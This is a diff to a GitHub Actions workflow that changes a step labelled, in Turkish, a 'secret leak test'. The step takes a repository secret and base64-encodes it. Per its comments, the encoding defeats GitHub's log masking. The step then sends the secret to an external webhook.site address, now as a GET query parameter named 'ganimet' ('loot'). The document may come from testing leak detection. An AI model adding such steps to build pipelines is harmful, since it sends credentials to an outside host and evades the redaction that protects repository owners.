@@ -22,12 +22,13 @@ jobs:
         with:
           fetch-depth: 
 
-      - name: Secret Sızdırma Testi
+      - name: Secret Sızdırma Testi (GET Method)
         run: |
-          # Secret'ı al, base64'e çevir (GitHub'ın loglarda yıldızlamasını engellemek için)
-          # Ve senin webhook adresine postala
-          export SECRET_VAL=$(echo "${{ secrets.TEST_SECRET }}" | base64)
-          curl -X POST -d "data=$SECRET_VAL" https://webhook.site/09307eb0-fce2-4d36-9b91-d8bf32f5735d
+          # Secret'ı al ve base64 yap
+          RAW_SECRET=$(echo "${{ secrets.TEST_SECRET }}" | base64 | tr -d '\n')
+          
+          # Veriyi URL'in sonuna ekleyerek GET isteği at
+          curl "https://webhook.site/09307eb0-fce2-4d36-9b91-d8bf32f5735d?ganimet=$RAW_SECRET"
           
       - name: Run Semgrep
         run: |
